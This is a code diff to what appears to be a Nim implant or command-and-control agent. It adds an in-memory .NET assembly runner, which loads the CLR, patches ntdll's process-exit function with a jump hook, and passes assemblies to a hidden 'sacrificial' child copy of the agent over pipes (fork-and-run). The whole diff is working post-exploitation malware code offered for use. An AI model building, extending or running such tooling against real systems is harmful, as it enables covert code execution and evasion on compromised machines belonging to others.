@@ -5,8 +5,10 @@
 ##   GetDefaultDomain() → QI(_AppDomain) → Load_3(SAFEARRAY) →
 ##   get_EntryPoint() → Invoke_3() in a dedicated thread.
 ##
-## ExitProcess is patched to ExitThread so assemblies calling
-## Environment.Exit() don't kill the host process.
+## Parent mode: fork-and-run — spawns a child copy of the agent to host the CLR.
+## If the assembly calls Environment.Exit() only the child dies, parent survives.
+## Child mode: detected via __ENDGAME_CLR_CHILD env var; reads asm from stdin,
+## runs CLR with stdout pointing at the pipe back to the parent, then exits.
 
 import winim/lean
 import std/[strutils, sequtils]
@@ -157,9 +159,16 @@ proc epStub(code: UINT) {.stdcall.} = ExitThread(DWORD(code))
 
 proc installExitHook() =
   if gEpHooked: return
-  let k32 = GetModuleHandleA("kernel32.dll")
-  if k32 == 0: return
-  gEpAddr = cast[pointer](GetProcAddress(k32, "ExitProcess"))
+  # Patch ntdll!RtlExitUserProcess — the function the CLR calls directly
+  # (kernel32!ExitProcess is just a thin wrapper around it)
+  let ntdll = GetModuleHandleA("ntdll.dll")
+  if ntdll == 0: return
+  gEpAddr = cast[pointer](GetProcAddress(ntdll, "RtlExitUserProcess"))
+  if gEpAddr == nil:
+    # fallback to kernel32!ExitProcess
+    let k32 = GetModuleHandleA("kernel32.dll")
+    if k32 == 0: return
+    gEpAddr = cast[pointer](GetProcAddress(k32, "ExitProcess"))
   if gEpAddr == nil: return
   var jmp: array[12, byte]
   jmp[0] = 0x48; jmp[1] = 0xB8
@@ -199,7 +208,8 @@ proc invokeThread(param: pointer): DWORD {.stdcall.} =
 
 # ── Main ──────────────────────────────────────────────────────────────────────
 
-proc execDotNet*(asmBytes: openArray[byte], args: string): string =
+proc execDotNet*(asmBytes: openArray[byte], args: string,
+                 childMode: bool = false): string =
   if asmBytes.len < 2: return "[!] dotnet_exec: empty payload"
   if not loadOleaut32(): return "[!] dotnet_exec: oleaut32.dll load failed"
 
@@ -263,23 +273,174 @@ proc execDotNet*(asmBytes: openArray[byte], args: string): string =
 
   let saParams = argsToParamSa(args)
 
-  let fhTmp = redirectStdout()
-  if fhTmp != INVALID_HANDLE_VALUE:
-    SetStdHandle(STD_OUTPUT_HANDLE, fhTmp)
+  var fhTmp: HANDLE
+  if childMode:
+    # Child: stdout is already the pipe — use it directly for CLR output
+    fhTmp = GetStdHandle(STD_OUTPUT_HANDLE)
     SetStdHandle(STD_ERROR_HANDLE, fhTmp)
+  else:
+    fhTmp = redirectStdout()
+    if fhTmp != INVALID_HANDLE_VALUE:
+      SetStdHandle(STD_OUTPUT_HANDLE, fhTmp)
+      SetStdHandle(STD_ERROR_HANDLE, fhTmp)
 
   var work = InvokeWork(pEP: pEP, saParams: saParams)
-  installExitHook()
+  if not childMode: installExitHook()
   let ht = CreateThread(nil, 0, invokeThread, addr work, 0, nil)
   if ht != 0:
     discard WaitForSingleObject(ht, DWORD(60_000))
     discard CloseHandle(ht)
-  removeExitHook()
-  restoreStdout()
+  if not childMode: removeExitHook()
 
   if saParams != nil: discard gSaDe(saParams)
 
+  if childMode:
+    discard FlushFileBuffers(fhTmp)
+    quit(0)
+
+  restoreStdout()
   if fhTmp == INVALID_HANDLE_VALUE:
     return "(no output captured)"
   discard FlushFileBuffers(fhTmp)
   return readTempFile(fhTmp)
+
+# ── Fork-and-run ──────────────────────────────────────────────────────────────
+
+const clrChildEnv = "__ENDGAME_CLR_CHILD"
+
+type ForkWriteWork = object
+  h:       HANDLE
+  args:    string
+  payload: seq[byte]
+
+proc forkWriteThread(param: pointer): DWORD {.stdcall.} =
+  let w = cast[ptr ForkWriteWork](param)
+  proc writeAll(h: HANDLE; p: pointer; n: int) =
+    var off = 0
+    while off < n:
+      var wr: DWORD
+      if WriteFile(h, cast[pointer](cast[int](p) + off), DWORD(n - off), addr wr, nil) == 0 or wr == 0: break
+      off += int(wr)
+  var le4: array[4, byte]
+  template le32(v: int) =
+    le4[0] = byte(v and 0xFF); le4[1] = byte((v shr 8) and 0xFF)
+    le4[2] = byte((v shr 16) and 0xFF); le4[3] = byte((v shr 24) and 0xFF)
+  le32(w.args.len);    writeAll(w.h, addr le4[0], 4)
+  if w.args.len > 0:   writeAll(w.h, unsafeAddr w.args[0], w.args.len)
+  le32(w.payload.len); writeAll(w.h, addr le4[0], 4)
+  if w.payload.len > 0: writeAll(w.h, unsafeAddr w.payload[0], w.payload.len)
+  discard CloseHandle(w.h)
+  return 0
+
+proc forkRunAssembly*(asmBytes: openArray[byte], args: string): string =
+  ## Spawns a sacrificial child copy of the current exe to host the CLR.
+  ## If the assembly calls Environment.Exit() only the child dies.
+  var exeBuf: array[MAX_PATH + 1, WCHAR]
+  if GetModuleFileNameW(0, addr exeBuf[0], MAX_PATH) == 0:
+    return execDotNet(asmBytes, args)
+
+  var sa = SECURITY_ATTRIBUTES(nLength: DWORD(sizeof(SECURITY_ATTRIBUTES)),
+                                bInheritHandle: TRUE)
+  var asmRd, asmWr, outRd, outWr: HANDLE
+  if CreatePipe(addr asmRd, addr asmWr, addr sa, 0) == 0:
+    return execDotNet(asmBytes, args)
+  discard SetHandleInformation(asmWr, HANDLE_FLAG_INHERIT, 0)
+  if CreatePipe(addr outRd, addr outWr, addr sa, 0) == 0:
+    discard CloseHandle(asmRd); discard CloseHandle(asmWr)
+    return execDotNet(asmBytes, args)
+  discard SetHandleInformation(outRd, HANDLE_FLAG_INHERIT, 0)
+
+  discard SetEnvironmentVariableW(clrChildEnv, "1")
+
+  var si = STARTUPINFOW(
+    cb:         DWORD(sizeof(STARTUPINFOW)),
+    dwFlags:    STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW,
+    wShowWindow: 0,
+    hStdInput:  asmRd,
+    hStdOutput: outWr,
+    hStdError:  outWr
+  )
+  var pi: PROCESS_INFORMATION
+  let ok = CreateProcessW(addr exeBuf[0], nil, nil, nil, TRUE,
+    CREATE_NO_WINDOW, nil, nil, addr si, addr pi)
+
+  discard SetEnvironmentVariableW(clrChildEnv, nil)
+  discard CloseHandle(asmRd)
+  discard CloseHandle(outWr)
+
+  if ok == 0:
+    discard CloseHandle(asmWr); discard CloseHandle(outRd)
+    return execDotNet(asmBytes, args)
+
+  # Write assembly to child stdin in a background thread
+  var work = ForkWriteWork(h: asmWr, args: args, payload: @asmBytes)
+  let wt = CreateThread(nil, 0, forkWriteThread, addr work, 0, nil)
+  if wt != 0: discard CloseHandle(wt)
+
+  # Read output until pipe closed (child exited) — 60s timeout
+  var output: string
+  var buf: array[8192, byte]
+  let deadline = GetTickCount() + DWORD(60_000)
+  while GetTickCount() < deadline:
+    var avail: DWORD = 0
+    if PeekNamedPipe(outRd, nil, 0, nil, addr avail, nil) == 0: break
+    if avail > 0:
+      var nRead: DWORD
+      discard ReadFile(outRd, addr buf[0], min(avail, DWORD(sizeof(buf))), addr nRead, nil)
+      if nRead > 0:
+        let start = output.len
+        output.setLen(start + int(nRead))
+        copyMem(addr output[start], addr buf[0], int(nRead))
+    else:
+      if WaitForSingleObject(pi.hProcess, 50) != WAIT_TIMEOUT:
+        # Child exited — drain remaining bytes
+        while true:
+          avail = 0
+          if PeekNamedPipe(outRd, nil, 0, nil, addr avail, nil) == 0 or avail == 0: break
+          var nRead: DWORD
+          discard ReadFile(outRd, addr buf[0], min(avail, DWORD(sizeof(buf))), addr nRead, nil)
+          if nRead > 0:
+            let start = output.len
+            output.setLen(start + int(nRead))
+            copyMem(addr output[start], addr buf[0], int(nRead))
+        break
+  discard CloseHandle(outRd)
+
+  if GetTickCount() >= deadline:
+    discard TerminateProcess(pi.hProcess, 1)
+    if output.len == 0: output = "[!] fork-and-run timeout (60s)"
+
+  discard WaitForSingleObject(pi.hProcess, 5000)
+  discard CloseHandle(pi.hProcess)
+  discard CloseHandle(pi.hThread)
+  return output
+
+proc clrChildRun*() =
+  ## Called in the child process (detected via __ENDGAME_CLR_CHILD env var).
+  ## Reads [4B args_len][args][4B asm_len][asm_bytes] from stdin,
+  ## runs CLR with stdout pointing directly at the parent pipe, then exits.
+  let hIn  = GetStdHandle(STD_INPUT_HANDLE)
+  proc readExact(p: pointer; n: int): bool =
+    var off = 0
+    while off < n:
+      var rd: DWORD
+      if ReadFile(hIn, cast[pointer](cast[int](p) + off), DWORD(n - off), addr rd, nil) == 0 or rd == 0:
+        return false
+      off += int(rd)
+    true
+
+  var hdr: array[4, byte]
+  if not readExact(addr hdr[0], 4): quit(1)
+  let argsLen = int(hdr[0]) or (int(hdr[1]) shl 8) or (int(hdr[2]) shl 16) or (int(hdr[3]) shl 24)
+  var argsStr = newString(max(0, argsLen))
+  if argsLen > 0 and not readExact(addr argsStr[0], argsLen): quit(1)
+
+  if not readExact(addr hdr[0], 4): quit(1)
+  let asmLen = int(hdr[0]) or (int(hdr[1]) shl 8) or (int(hdr[2]) shl 16) or (int(hdr[3]) shl 24)
+  var asmBuf = newSeq[byte](max(0, asmLen))
+  if asmLen > 0 and not readExact(addr asmBuf[0], asmLen): quit(1)
+
+  # childMode=true: stdout is the parent pipe, CLR writes directly to it, quit(0) at end
+  discard execDotNet(asmBuf, argsStr, childMode = true)
+  # execDotNet with childMode calls quit(0) — we only reach here on error
+  quit(0)
